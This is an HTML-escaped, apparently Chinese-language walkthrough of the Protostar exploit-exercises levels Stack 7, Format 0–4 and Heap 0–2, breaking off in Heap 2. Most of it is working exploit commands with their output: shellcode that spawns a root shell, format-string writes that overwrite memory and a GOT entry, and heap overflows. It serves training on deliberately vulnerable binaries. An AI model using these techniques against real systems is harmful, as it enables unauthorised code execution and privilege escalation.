&lt;p&gt;总览：http:&#x2F;&#x2F;www.bitforestinfo.com&#x2F;2018&#x2F;04&#x2F;binary-exploitation-protostar-stack6_6.html&lt;&#x2F;p&gt;
&lt;p&gt;ret2.text：http:&#x2F;&#x2F;www.bitforestinfo.com&#x2F;2018&#x2F;04&#x2F;binary-exploitation-protostar-stack6_20.html&lt;&#x2F;p&gt;
&lt;p&gt;ret2libc：https:&#x2F;&#x2F;ohexfortyone.com&#x2F;2018&#x2F;03&#x2F;exploit-exercises-protostar-stack-6.html&lt;&#x2F;p&gt;
&lt;p&gt;ret2libc：https:&#x2F;&#x2F;medium.com&#x2F;@airman604&#x2F;protostar-stack7-walkthrough-2aa2428be3e0&lt;&#x2F;p&gt;
&lt;p&gt;ROP：&lt;a rel=&quot;noopener nofollow noreferrer&quot; target=&quot;_blank&quot; href=&quot;https:&#x2F;&#x2F;media.blackhat.com&#x2F;bh-usa-08&#x2F;video&#x2F;bh-us-08-Shacham&#x2F;black-hat-usa-08-shacham-return-oriented-programming-hires.m4v&quot;&gt;blackhat-Return-Oriented Programming: Exploits Without Code Injection&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;ROP：&lt;a rel=&quot;noopener nofollow noreferrer&quot; target=&quot;_blank&quot; href=&quot;https:&#x2F;&#x2F;speakerdeck.com&#x2F;l4ys&#x2F;rop-qing-song-tan&quot;&gt;ROP轻松谈&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;h1 id=&quot;stack-7&quot;&gt;Stack 7&lt;&#x2F;h1&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;msf &amp;gt; msfelfscan stack7
[*] exec: msfelfscan stack7

Usage: &amp;#x2F;usr&amp;#x2F;share&amp;#x2F;metasploit-framework&amp;#x2F;vendor&amp;#x2F;bundle&amp;#x2F;ruby&amp;#x2F;2.5.0&amp;#x2F;bin&amp;#x2F;msfelfscan [mode] &amp;lt;options&amp;gt; [targets]

Modes:
    -j, --jump [regA,regB,regC]      Search for jump equivalent instructions
    -p, --poppopret                  Search for pop+pop+ret combinations
    -r, --regex [regex]              Search for regex match
    -a, --analyze-address [address]  Display the code at the specified address
    -b, --analyze-offset [offset]    Display the code at the specified offset

Options:
    -A, --after [bytes]              Number of bytes to show after match (-a&amp;#x2F;-b)
    -B, --before [bytes]             Number of bytes to show before match (-a&amp;#x2F;-b)
    -D, --disasm                     Disassemble the bytes at this address
    -I, --image-base [address]       Specify an alternate ImageBase
    -h, --help                       Show this message
msf &amp;gt; msfelfscan --jump eax stack7
[*] exec: msfelfscan --jump eax stack7

[stack7]
0x080484bf call eax
0x080485eb call eax
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;$ (python -c &amp;quot;print &amp;#x27;\xb8\x2f\x73\x68\xf0\x25\xff\xff\xff\x0f\x50\xb8\x2f\x62\x69\x6e\x50\x89\xe3\x31\xc0\xb0\x0b\x31\xc9\x31\xd2\xcd\x80&amp;#x27;+(80-29)*&amp;#x27;\xcc&amp;#x27;+&amp;#x27;\xbf\x84\x04\x08&amp;#x27;&amp;quot;; cat) | .&amp;#x2F;stack7
input path please: got path ▒&amp;#x2F;sh▒%▒▒▒P▒&amp;#x2F;binP▒▒1▒
                                                1▒1▒̀▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒̿▒▒▒▒▒▒▒▒▒▒▒̿▒
id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h1 id=&quot;format-0&quot;&gt;Format 0&lt;&#x2F;h1&gt;
&lt;h2 id=&quot;solution-0-stackoverflow&quot;&gt;solution 0: stackoverflow&lt;&#x2F;h2&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;$ python -c &amp;quot;print &amp;#x27;a&amp;#x27;*64+&amp;#x27;\xef\xbe\xad\xde&amp;#x27;&amp;quot; | xargs .&amp;#x2F;format0
you have hit the target correctly :)
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h2 id=&quot;solution-1-format-string&quot;&gt;solution 1: format string&lt;&#x2F;h2&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;$  python -c &amp;quot;print &amp;#x27;%64d\xef\xbe\xad\xde&amp;#x27;&amp;quot; | xargs .&amp;#x2F;format0
you have hit the target correctly :)
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h1 id=&quot;format-1&quot;&gt;Format 1&lt;&#x2F;h1&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;$ objdump -t format1 | grep target
08049638 g     O .bss   00000004              target
$ .&amp;#x2F;format1 `python -c &amp;quot;print &amp;#x27;\x38\x96\x04\x08A&amp;#x27; +&amp;#x27;%08x.&amp;#x27;*127+&amp;#x27;%08n.&amp;#x27;+&amp;#x27;%08x.&amp;#x27;*22&amp;quot;`
8A0804960c.bffff9e8.08048469.b7fd8304.b7fd7ff4.bffff9e8.08048435.bffffbb0.b7ff1040.0804845b.b7fd7ff4.08048450.00000000.bffffa68.b7eadc76.00000002.bffffa94.bffffaa0.b7fe1848.bffffa50.ffffffff.b7ffeff4.0804824d.00000001.bffffa50.b7ff0626.b7fffab0.b7fe1b28.b7fd7ff4.00000000.00000000.bffffa68.e6b62d35.ccfdbb25.00000000.00000000.00000000.00000002.08048340.00000000.b7ff6210.b7eadb9b.b7ffeff4.00000002.08048340.00000000.08048361.0804841c.00000002.bffffa94.08048450.08048440.b7ff1040.bffffa8c.b7fff8f8.00000002.bffffba6.bffffbb0.00000000.bffffea4.bffffec6.bffffed0.bffffee4.bffffef6.bfffff06.bfffff19.bfffff26.bfffff31.bfffff6f.bfffff86.bfffff97.bfffffa5.bfffffbc.00000000.00000020.b7fe2414.00000021.b7fe2000.00000010.0f8bfbff.00000006.00001000.00000011.00000064.00000003.08048034.00000004.00000020.00000005.00000007.00000007.b7fe3000.00000008.00000000.00000009.08048340.0000000b.000003e9.0000000c.00000000.0000000d.000003e9.0000000e.000003e9.00000017.00000001.00000019.bffffb8b.0000001f.bffffff2.0000000f.bffffb9b.00000000.00000000.00000000.00000000.00000000.4f000000.e6ba1f47.9c250ca2.20d18978.691cdb81.00363836.00000000.2f2e0000.6d726f66.00317461..38302541.30252e78.252e7838.2e783830.78383025.3830252e.30252e78.252e7838.2e783830.78383025.3830252e.30252e78.252e7838.2e783830.78383025.3830252e.30252e78.252e7838.2e783830.78383025.3830252e.30252e78.you have modified the target :)
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;$ i=0; while [ $i -le 200 ]; do .&amp;#x2F;format1 `python -c &amp;quot;print &amp;#x27;aaaa%%%03d\\\$08x.&amp;#x27; % $i&amp;quot;` ; i=$((i+1)); done
aaaa%0$08x.aaaa0804960c.aaaabffffcc8.aaaa08048469.aaaab7fd8304.aaaab7fd7ff4.aaaabffffcc8.aaaa08048435.aaaabffffe98.aaaab7ff1040.aaaa0804845b.aaaab7fd7ff4.aaaa08048450.aaaa00000000.aaaabffffd48.aaaab7eadc76.aaaa00000002.aaaabffffd74.aaaabffffd80.aaaab7fe1848.aaaabffffd30.aaaaffffffff.aaaab7ffeff4.aaaa0804824d.aaaa00000001.aaaabffffd30.aaaab7ff0626.aaaab7fffab0.aaaab7fe1b28.aaaab7fd7ff4.aaaa00000000.aaaa00000000.aaaabffffd48.aaaa4e55cc8b.aaaa9d54d149.aaaa00000000.aaaa00000000.aaaa00000000.aaaa00000002.aaaa08048340.aaaa00000000.aaaab7ff6210.aaaab7eadb9b.aaaab7ffeff4.aaaa00000002.aaaa08048340.aaaa00000000.aaaa08048361.aaaa0804841c.aaaa00000002.aaaabffffd74.aaaa08048450.aaaa08048440.aaaab7ff1040.aaaabffffd6c.aaaab7fff8f8.aaaa00000002.aaaabffffe8e.aaaabffffe98.aaaa00000000.aaaabffffea6.aaaabffffec7.aaaabffffed1.aaaabffffee5.aaaabffffef7.aaaabfffff07.aaaabfffff1a.aaaabfffff27.aaaabfffff32.aaaabfffff70.aaaabfffff87.aaaabfffff98.aaaabfffffa6.aaaabfffffbd.aaaa00000000.aaaa00000020.aaaab7fe2414.aaaa00000021.aaaab7fe2000.aaaa00000010.aaaa0f8bfbff.aaaa00000006.aaaa00001000.aaaa00000011.aaaa00000064.aaaa00000003.aaaa08048034.aaaa00000004.aaaa00000020.aaaa00000005.aaaa00000007.aaaa00000007.aaaab7fe3000.aaaa00000008.aaaa00000000.aaaa00000009.aaaa08048340.aaaa0000000b.aaaa000003e9.aaaa0000000c.aaaa00000000.aaaa0000000d.aaaa000003e9.aaaa0000000e.aaaa000003e9.aaaa00000017.aaaa00000001.aaaa00000019.aaaabffffe6b.aaaa0000001f.aaaabffffff2.aaaa0000000f.aaaabffffe7b.aaaa00000000.aaaa00000000.aaaa00000000.aaaa00000000.aaaa00000000.aaaa8c000000.aaaa4f4034dd.aaaaa130a824.aaaa613016f9.aaaa696337b9.aaaa00363836.aaaa00000000.aaaa00000000.aaaa00000000.aaaa2f2e0000.aaaa6d726f66.aaaa00317461.aaaa61616161.aaaa31333125.aaaa78383024.aaaa5353002e.aaaa4c435f48.aaaa544e4549.aaaa3239313d.aaaa3836312e.aaaa3631312e.aaaa3220312e.aaaa20383335.aaaa55003232.aaaa3d524553.aaaa72657375.aaaa49414d00.aaaa762f3d4c.aaaa6d2f7261.aaaa2f6c6961.aaaa72657375.aaaa444c4f00.aaaa3d445750.aaaa6d6f682f.aaaa73752f65.aaaa48007265.aaaa3d454d4f.aaaa6d6f682f.aaaa73752f65.aaaa53007265.aaaa545f4853.aaaa2f3d5954.aaaa2f766564.aaaa2f737470.aaaa4f4c0030.aaaa4d414e47.aaaa73753d45.aaaa54007265.aaaa3d4d5245.aaaa72657478.aaaa4150006d.aaaa2f3d4854.aaaa2f727375.aaaa61636f6c.aaaa69622f6c.aaaa752f3a6e.aaaa622f7273.aaaa2f3a6e69.aaaa3a6e6962.aaaa7273752f.aaaa636f6c2f.aaaa672f6c61.aaaa73656d61.aaaa73752f3a.aaaa61672f72.aaaa0073656d.aaaa50534944.aaaa3d59414c.aaaa61636f6c.aaaa736f686c.aaaa30313a74.aaaa4c00302e.aaaa3d474e41.aaaa555f6e65.aaaa54552e53.aaaa00382d46.aaaa4c454853.aaaa622f3d4c.aaaa732f6e69.aaaa57500068.aaaa6f2f3d44.aaaa702f7470.aaaa6f746f72.
$ .&amp;#x2F;format1 `python -c &amp;quot;print &amp;#x27;\x38\x96\x04\x08%130\\\$08n.&amp;#x27;&amp;quot;`
8.you have modified the target :)
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h1 id=&quot;format-2&quot;&gt;Format 2&lt;&#x2F;h1&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;$ objdump -t format2 | grep target
080496e4 g     O .bss   00000004              target
$ i=0; while [ $i -le 10 ]; do python -c &amp;quot;print &amp;#x27;aaaa%%%03d\$08x.&amp;#x27; % $i&amp;quot; | .&amp;#x2F;format2 ; i=$((i+1)); done
aaaa%0$08x.
target is 0 :(
aaaa00000200.
target is 0 :(
aaaab7fd8420.
target is 0 :(
aaaabffffb14.
target is 0 :(
aaaa61616161.
target is 0 :(
aaaa35303025.
target is 0 :(
aaaa78383024.
target is 0 :(
aaaa00000a2e.
target is 0 :(
aaaab7fff524.
target is 0 :(
aaaabffffb70.
target is 0 :(
aaaab7fe35c9.
target is 0 :(
$ python -c &amp;quot;print &amp;#x27;\xe4\x96\x04\x08aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%004\$08x.&amp;#x27;&amp;quot; | .&amp;#x2F;format2
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa080496e4.
target is 0 :(
$ python -c &amp;quot;print &amp;#x27;\xe4\x96\x04\x08aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%004\$08n.&amp;#x27;&amp;quot; | .&amp;#x2F;format2
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.
you have modified the target :)
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h1 id=&quot;format-3&quot;&gt;Format 3&lt;&#x2F;h1&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;$ objdump -t format3 | grep target
080496f4 g     O .bss   00000004              target
$ i=0; while [ $i -le 20 ]; do python -c &amp;quot;print &amp;#x27;aaaa%%%03d\$08x.&amp;#x27; % $i&amp;quot; | .&amp;#x2F;format3 ; i=$((i+1)); done
aaaa%0$08x.
target is 00000000 :(
aaaa00000000.
target is 00000000 :(
aaaabffffad0.
target is 00000000 :(
aaaab7fd7ff4.
target is 00000000 :(
aaaa00000000.
target is 00000000 :(
aaaa00000000.
target is 00000000 :(
aaaabffffcd8.
target is 00000000 :(
aaaa0804849d.
target is 00000000 :(
aaaabffffad0.
target is 00000000 :(
aaaa00000200.
target is 00000000 :(
aaaab7fd8420.
target is 00000000 :(
aaaabffffb14.
target is 00000000 :(
aaaa61616161.
target is 00000000 :(
aaaa33313025.
target is 00000000 :(
aaaa78383024.
target is 00000000 :(
aaaa00000a2e.
target is 00000000 :(
aaaab7fff524.
target is 00000000 :(
aaaabffffb70.
target is 00000000 :(
aaaab7fe35c9.
target is 00000000 :(
aaaa00000007.
target is 00000000 :(
aaaa00000010.
target is 00000000 :(
$ python -c &amp;quot;print &amp;#x27;\xf4\x96\x04\x08aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%12\$08x.&amp;#x27;&amp;quot; | .&amp;#x2F;format3
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa080496f4.
target is 00000000 :(
$ python -c &amp;quot;print &amp;#x27;a%13\$08n\xf3\x96\x04\x08aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%12\$08x.&amp;#x27;&amp;quot; | .&amp;#x2F;format3
Segmentation fault
$ python -c &amp;quot;print &amp;#x27;a%13\$08x\xf3\x96\x04\x08aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%12\$08x.&amp;#x27;&amp;quot; | .&amp;#x2F;format3
a78383024aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa33312561.
target is 00000000 :(
$ python -c &amp;quot;print &amp;#x27;a%14\$08x\xf3\x96\x04\x08aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%12\$08x.&amp;#x27;&amp;quot; | .&amp;#x2F;format3
a080496f3aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa34312561.
target is 00000000 :(
$ python -c &amp;quot;print &amp;#x27;a%14\$08n\xf3\x96\x04\x08aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%12\$08x.&amp;#x27;&amp;quot; | .&amp;#x2F;format3
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa34312561.
target is 00000000 :(
$ python -c &amp;quot;print &amp;#x27;a%14\$08n\xf5\x96\x04\x08aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%12\$08x.&amp;#x27;&amp;quot; | .&amp;#x2F;format3
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa34312561.
target is 00000100 :(
$ python -c &amp;quot;print &amp;#x27;a%16\$08na%17\$08n\xf7\x96\x04\x08\xf8\x96\x04\x08aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%12\$08x.&amp;#x27;&amp;quot; | .&amp;#x2F;format3
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa36312561.
target is 01000000 :(
$ python -c &amp;quot;print &amp;#x27;a%16\$08na%17\$08n\xf7\x96\x04\x06\xf8\x96\x04\x08aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%12\$08x.&amp;#x27;&amp;quot; | .&amp;#x2F;format3
Segmentation fault
$ python -c &amp;quot;print &amp;#x27;a%16\$08na%17\$08n\xf7\x96\x04\x08\xf6\x96\x04\x08aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%12\$08x.&amp;#x27;&amp;quot; | .&amp;#x2F;format3
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa36312561.
target is 00020000 :(
$ python -c &amp;quot;print &amp;#x27;\xf4\x96\x04\x08\xf5\x96\x04\x08\xf6\x96\x04\x08&amp;#x27;+&amp;#x27;a&amp;#x27;*(0x44-12)+&amp;#x27;%12\$08x.&amp;#x27;+&amp;#x27;a&amp;#x27;*(0x55-0x44)+&amp;#x27;%13\$08x.&amp;#x27;+&amp;#x27;a&amp;#x27;*(0x102-0x55)+&amp;#x27;%14\$08x.&amp;#x27;&amp;quot; | .&amp;#x2F;format3
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa080496f4.aaaaaaaaaaaaaaaaa080496f5.aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa080496f6.
target is 00000000 :(
$ python -c &amp;quot;print &amp;#x27;\xf4\x96\x04\x08\xf5\x96\x04\x08\xf6\x96\x04\x08&amp;#x27;+&amp;#x27;a&amp;#x27;*(0x44-12)+&amp;#x27;%12\$08x&amp;#x27;+&amp;#x27;a&amp;#x27;*(0x55-0x44)+&amp;#x27;%13\$08x&amp;#x27;+&amp;#x27;a&amp;#x27;*(0x102-0x55)+&amp;#x27;%14\$08x&amp;#x27;&amp;quot; | .&amp;#x2F;format3
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa080496f4aaaaaaaaaaaaaaaaa080496f5aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa080496f6
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h2 id=&quot;solution-0-brute&quot;&gt;solution 0: Brute!&lt;&#x2F;h2&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;$ python -c &amp;quot;print &amp;#x27;\xf4\x96\x04\x08&amp;#x27;+&amp;#x27;%016930112d&amp;#x27;+&amp;#x27;%12\$08n&amp;#x27;&amp;quot; | .&amp;#x2F;format3

# 反正这里有很多很多很多零，我就好心删了它们
...0000000000000
you have modified the target :)
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h2 id=&quot;solution-1-gentle&quot;&gt;solution 1: Gentle&lt;&#x2F;h2&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;$ python -c &amp;quot;print &amp;#x27;\xf4\x96\x04\x08\xf5\x96\x04\x08\xf6\x96\x04\x08&amp;#x27;+&amp;#x27;a&amp;#x27;*(0x44-12)+&amp;#x27;%12\$08n&amp;#x27;+&amp;#x27;a&amp;#x27;*(0x55-0x44)+&amp;#x27;%13\$08n&amp;#x27;+&amp;#x27;a&amp;#x27;*(0x102-0x55)+&amp;#x27;%14\$08n&amp;#x27;&amp;quot; | .&amp;#x2F;format3
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
you have modified the target :)
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h2 id=&quot;solution-2-more-gentle&quot;&gt;solution 2: More gentle&lt;&#x2F;h2&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;$ python -c &amp;quot;print &amp;#x27;a&amp;#x27;+&amp;#x27;%16\$hhn&amp;#x27;+&amp;#x27;a&amp;#x27;+&amp;#x27;%17\$hhn&amp;#x27;+&amp;#x27;\xf7\x96\x04\x08&amp;#x27;+&amp;#x27;\xf6\x96\x04\x08&amp;#x27;+&amp;#x27;\xf5\x96\x04\x08&amp;#x27;+&amp;#x27;\xf4\x96\x04\x08&amp;#x27;+&amp;#x27;a&amp;#x27;*(0x44-2-16)+&amp;#x27;%19\$hhn&amp;#x27;+&amp;#x27;a&amp;#x27;*(0x55-0x44)+&amp;#x27;%18\$hhn&amp;#x27;&amp;quot; | .&amp;#x2F;format3
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
you have modified the target :)
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h1 id=&quot;format-4&quot;&gt;Format 4&lt;&#x2F;h1&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;$ gdb -q format4
Reading symbols from &amp;#x2F;opt&amp;#x2F;protostar&amp;#x2F;bin&amp;#x2F;format4...done.
(gdb) disas hello
Dump of assembler code for function hello:
0x080484b4 &amp;lt;hello+0&amp;gt;:   push   %ebp
0x080484b5 &amp;lt;hello+1&amp;gt;:   mov    %esp,%ebp
0x080484b7 &amp;lt;hello+3&amp;gt;:   sub    $0x18,%esp
0x080484ba &amp;lt;hello+6&amp;gt;:   movl   $0x80485f0,(%esp)
0x080484c1 &amp;lt;hello+13&amp;gt;:  call   0x80483dc &amp;lt;puts@plt&amp;gt;
0x080484c6 &amp;lt;hello+18&amp;gt;:  movl   $0x1,(%esp)
0x080484cd &amp;lt;hello+25&amp;gt;:  call   0x80483bc &amp;lt;_exit@plt&amp;gt;
End of assembler dump.
(gdb) quit
$ objdump -TR format4

format4:     file format elf32-i386

DYNAMIC SYMBOL TABLE:
00000000  w   D  *UND*  00000000              __gmon_start__
00000000      DF *UND*  00000000  GLIBC_2.0   fgets
00000000      DF *UND*  00000000  GLIBC_2.0   __libc_start_main
00000000      DF *UND*  00000000  GLIBC_2.0   _exit
00000000      DF *UND*  00000000  GLIBC_2.0   printf
00000000      DF *UND*  00000000  GLIBC_2.0   puts
00000000      DF *UND*  00000000  GLIBC_2.0   exit
080485ec g    DO .rodata        00000004  Base        _IO_stdin_used
08049730 g    DO .bss   00000004  GLIBC_2.0   stdin


DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE
080496fc R_386_GLOB_DAT    __gmon_start__
08049730 R_386_COPY        stdin
0804970c R_386_JUMP_SLOT   __gmon_start__
08049710 R_386_JUMP_SLOT   fgets
08049714 R_386_JUMP_SLOT   __libc_start_main
08049718 R_386_JUMP_SLOT   _exit
0804971c R_386_JUMP_SLOT   printf
08049720 R_386_JUMP_SLOT   puts
08049724 R_386_JUMP_SLOT   exit

$ objdump -t format4 | grep hello
080484b4 g     F .text  0000001e              hello
$ i=0; while [ $i -le 10 ]; do i=$((i+1)); python -c &amp;quot;print &amp;#x27;aaaa%%%03d\$08x&amp;#x27; % $i&amp;quot; | .&amp;#x2F;format4; done
aaaa00000200
aaaab7fd8420
aaaabffffb14
aaaa61616161
aaaa35303025
aaaa78383024
aaaa0000000a
aaaab7fff524
aaaabffffb70
aaaab7fe35c9
aaaa00000007
(gdb) b *0x0804851a
Breakpoint 1 at 0x804851a: file format4&amp;#x2F;format4.c, line 27.
(gdb) r
Starting program: &amp;#x2F;opt&amp;#x2F;protostar&amp;#x2F;bin&amp;#x2F;format4

Breakpoint 1, main (argc=1, argv=0xbffffd54) at format4&amp;#x2F;format4.c:27
27      format4&amp;#x2F;format4.c: No such file or directory.
        in format4&amp;#x2F;format4.c
(gdb) p exit
$1 = {&amp;lt;text variable, no debug info&amp;gt;} 0xb7ec60c0 &amp;lt;*__GI_exit&amp;gt;
(gdb) quit

$ python -c &amp;quot;print &amp;#x27;\x24\x97\x04\x08&amp;#x27;+&amp;#x27;\x25\x97\x04\x08&amp;#x27;+&amp;#x27;\x26\x97\x04\x08&amp;#x27;+&amp;#x27;\x27\x97\x04\x08&amp;#x27;+&amp;#x27;%164x%4\$n&amp;#x27;+&amp;#x27;%208x%5\$n&amp;#x27;+&amp;#x27;%128x%6\$n&amp;#x27;+&amp;#x27;%260x%7\$n&amp;#x27;&amp;quot; | .&amp;#x2F;format4
$%&amp;amp;&amp;#x27;                                                                                                                                                                 200                                                                                                                                                                                                        b7fd8420                                                                                                                        bffffb14                                                                                                                                                                                                                                                             8049724
code execution redirected! you win


&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h1 id=&quot;heap-0&quot;&gt;Heap 0&lt;&#x2F;h1&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;$ objdump -t heap0 | grep winner
08048464 g     F .text  00000014              winner
08048478 g     F .text  00000014              nowinner
$ .&amp;#x2F;heap0 `python -c &amp;quot;print &amp;#x27;a&amp;#x27;*72+&amp;#x27;\x64\x84\x04\x08&amp;#x27;&amp;quot;`
data is at 0x804a008, fp is at 0x804a050
level passed
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h1 id=&quot;heap-1&quot;&gt;Heap 1&lt;&#x2F;h1&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;$ ltrace .&amp;#x2F;heap1 1234 1234
__libc_start_main(0x80484b9, 3, 0xbffffd84, 0x8048580, 0x8048570 &amp;lt;unfinished ...&amp;gt;
malloc(8)                                             = 0x0804a008
malloc(8)                                             = 0x0804a018
malloc(8)                                             = 0x0804a028
malloc(8)                                             = 0x0804a038
strcpy(0x0804a018, &amp;quot;1234&amp;quot;)                            = 0x0804a018
strcpy(0x0804a038, &amp;quot;1234&amp;quot;)                            = 0x0804a038
puts(&amp;quot;and that&amp;#x27;s a wrap folks!&amp;quot;and that&amp;#x27;s a wrap folks!
)                      = 25
+++ exited (status 25) +++
$ objdump -t heap1 | grep winner
08048494 g     F .text  00000025              winner
$ objdump -TR heap1 | grep puts
00000000      DF *UND*  00000000  GLIBC_2.0   puts
08049774 R_386_JUMP_SLOT   puts
$ .&amp;#x2F;heap1 `python -c &amp;quot;print &amp;#x27;a&amp;#x27;*20+&amp;#x27;\x74\x97\x04\x08&amp;#x27;&amp;quot;` `python -c &amp;quot;print &amp;#x27;\x94\x84\x04\x08&amp;#x27;&amp;quot;`
and we have a winner @ 1532607490
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h1 id=&quot;heap-2&quot;&gt;Heap 2&lt;&#x2F;h1&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;$ .&amp;#x2F;heap2
[ auth = (nil), service = (nil) ]
auth wang
[ auth = 0x804c008, service = (nil) ]
reset
[ auth = 0x804c008, service = (nil) ]
serviceaaaaaaaaaaaaaaaaaaaaaaaaa
